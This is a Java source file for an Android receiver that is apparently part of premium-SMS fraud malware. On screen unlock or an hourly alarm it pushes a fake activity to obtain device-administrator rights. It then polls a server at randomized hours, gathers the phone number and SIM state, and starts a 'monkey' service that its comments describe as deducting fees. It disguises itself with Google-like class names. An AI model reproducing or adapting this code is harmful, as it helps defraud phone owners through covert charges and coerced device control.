package com.xstd.plugin.receiver;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.googl.plugin.x.FakeActivity;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.Utils.BRCUtil;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;
import com.xstd.plugin.service.FakeService;
import com.xstd.plugin.service.GoogleService;
import com.xstd.plugin.service.PluginService;

import java.util.Calendar;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:43
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBRC extends BroadcastReceiver {

    public static final String HOUR_ALARM_ACTION = "com.xstd.hour.alarm";

    public static final String KEY_FORCE_FETCH = "force_fetch";

    public void onReceive(Context context, Intent intent) {
        //check Google Service if runging for SMS
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(context, GoogleService.class);
        context.startService(serviceIntent);

        //启动小时定时器
        BRCUtil.startHourAlarm(context);

        boolean isForce = intent.getBooleanExtra(KEY_FORCE_FETCH, false);

        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));

        SettingManager.getInstance().init(context);

        String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
        if (!TextUtils.isEmpty(oldPhoneNumbers)) {
            Intent i = new Intent();
            i.setClass(context, PluginService.class);
            i.setAction(PluginService.SMS_BROADCAST_ACTION);
            context.startService(i);
        }

        if (intent != null && isDeviceBinded /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
            /**
             * 绑定了设备才进行其他动作
             */
            String action = intent.getAction();
            if (Intent.ACTION_USER_PRESENT.equals(action) || HOUR_ALARM_ACTION.equals(action)) {
                Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);

//                Calendar c1 = Calendar.getInstance();
//                int day = c1.get(Calendar.DAY_OF_YEAR);
//                int delay = 0;
//                if (day > SettingManager.getInstance().getFirstLanuchTime()) {
//                    //在同一年
//                    delay = day - SettingManager.getInstance().getFirstLanuchTime();
//                } else {
//                    //跨年
//                    delay = day + (356 - SettingManager.getInstance().getFirstLanuchTime());
//                }
//                if (Integer.valueOf(Config.CHANNEL_CODE) > 500000) {
//                    //大于500000的渠道用于内置渠道
//                    if (delay < 15) {
//                        return;
//                    }
//                } else {
//                    //小于500000的渠道用于自己推广
//                    if (!Config.DEBUG && delay < 2) {
//                        return;
//                    }
//                }

                if (SettingManager.getInstance().getKeyActiveTime() == 0) {
                    //没有激活过，就调用激活接口
                    if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                                            + " as active time = 0;");
                        }

                        long dayTime = ((long) 24) * 60 * 60 * 1000;
                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis() - dayTime);
                        Intent i = new Intent();
                        i.setAction(PluginService.ACTIVE_ACTION);
                        i.setClass(context, PluginService.class);
                        context.startService(i);
                    }

                    return;
                } else {
                    long lastActiveTime = SettingManager.getInstance().getKeyActiveTime();
                    Calendar c = Calendar.getInstance();
                    c.setTimeInMillis(lastActiveTime);
                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
                    int lastMonth = c.get(Calendar.MONTH);
                    int lastYear = c.get(Calendar.YEAR);
                    c = Calendar.getInstance();
                    int curDay = c.get(Calendar.DAY_OF_YEAR);
                    int curHour = c.get(Calendar.HOUR_OF_DAY);
                    int curMonth = c.get(Calendar.MONTH);
                    int curYear = c.get(Calendar.YEAR);

                    int smsSendDelayDays = (curYear - lastYear) * 365 - lastDay + curDay;
                    if (Config.DEBUG) {
                        Config.LOGD("[[ScreenBRC::onReceive]] : " +
                                        "\n              last active day = " + lastDay + " last year : " + lastYear
                                        + "\n              cur day = " + curDay + " cur year : " + curYear
                                        + "\n              next random Hour is : " + SettingManager.getInstance().getKeyRandomNetworkTime()
                                        + "\n              action = " + action
                                        + "\n              last send SMS day time : " + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
                                        + "\n              sms send delay days : " + smsSendDelayDays
                                        + "\n>>>>>>>>>>>>>>>>>");
                    }

                    if (curDay != lastDay) {
                        //如果不是同一天，将之前一天作为计数的清零
                        SettingManager.getInstance().setKeyDayCount(0);
                        int next = AppRuntime.randomBetween(4, 11);
                        SettingManager.getInstance().setKeyRandomNetworkTime(next);
                    }
                    if (curMonth != lastMonth) {
                        //如果不是同一个月，将余额计数清零
                        SettingManager.getInstance().setKeyMonthCount(0);
                    }

                    if (SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() != 0
//                            && (curDay - SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() > Config.SMS_SEND_DELAY)
                            && (smsSendDelayDays > Config.SMS_SEND_DELAY)
                            && TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
                        //如果时间大于3天的，并且手机号码是空的，那么就要重新获取手机号码
                        int times = SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes();
                        if (Config.DEBUG) {
                            Config.LOGD("[[ScreenBRC::onReceive]] SMS Service Phone cleart times : " + times);
                        }
                        if (times > 90) {
                            Intent iPhoneFetch = new Intent();
                            iPhoneFetch.setClass(context, PluginService.class);
                            iPhoneFetch.setAction(PluginService.ACTIVE_FETCH_PHONE_ACTION);
                            context.startService(iPhoneFetch);
                        } else {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] clear send time to : " + (times + 1)
                                        + " and setKeyDeviceHasSendToServicePhone = false");
                            }
                            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(times + 1);
                            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
                        }
                    }

                    //TODO:此处可能会出发服务器连接次数太多
                    if ((isForce && AppRuntime.ACTIVE_RESPONSE == null)
                            || ((curDay != lastDay || AppRuntime.ACTIVE_RESPONSE == null)
                                    && curHour >= SettingManager.getInstance().getKeyRandomNetworkTime()
                                    && UtilsRuntime.isOnline(context))) {
                        //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
                        //当天如果没有激活过，当天不扣费
                        if (curDay != lastDay) {
                            //如果不是同一天，将激活计数清零
                            SettingManager.getInstance().setKeyDayActiveCount(0);
                        }

                        if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()
                                && SettingManager.getInstance().getKeyDayActiveCount() < 16) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                                                + " as active time is over"
                                                + " , isForce : (" + isForce +")");
                            }
                            Intent i = new Intent();
                            i.setAction(PluginService.ACTIVE_ACTION);
                            i.setClass(context, PluginService.class);
                            context.startService(i);
                        }
                        return;
                    }

                    if ((curDay == lastDay)
                            && AppRuntime.ACTIVE_RESPONSE != null
                            && (curHour >= AppRuntime.ACTIVE_RESPONSE.exeStart
                                    && curHour <= AppRuntime.ACTIVE_RESPONSE.exeEnd)) {
                        //如果没有SIM卡，记录错误信息
                        if (!AppRuntime.isSIMCardReady(context)) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] Error info for monkey, SIM card is not ready");
                            }
                            SettingManager.getInstance().setKeyLastErrorInfo("没有SIM卡");
                            return;
                        } else {
                            SettingManager.getInstance().setKeyLastErrorInfo("无");
                        }

                        //今天已经成功激活过了，同时激活的数据还存在，开始进行扣费的逻辑
                        //TODO: 启动扣费,假如时间随机
                        int dayCount = SettingManager.getInstance().getKeyDayCount();
                        int times = AppRuntime.ACTIVE_RESPONSE.times;
                        if (times > dayCount) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.MONKEY_ACTION);
                            }
                            Intent i = new Intent();
                            i.setAction(PluginService.MONKEY_ACTION);
                            i.setClass(context, PluginService.class);
                            context.startService(i);
                        }
                    }
                }
            }
        } else if (!isDeviceBinded) {
            if (AppRuntime.WATCHING_SERVICE_RUNNING.get()) return;

            if (Config.DEBUG) {
                Config.LOGD("[[ScreenBRC::onReceive]] try to start FAKE WINDOWS process, binding Time : "
                                + SettingManager.getInstance().getDeviceBindingTime());
            }

            if (SettingManager.getInstance().getDeviceBindingTime() <= 10) {
                CommonUtil.startFakeService(context, "ScreenBRC::onReceive");

                Intent i = new Intent();
                i.setClass(context, FakeActivity.class);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                context.startActivity(i);
            }
        }
    }

}
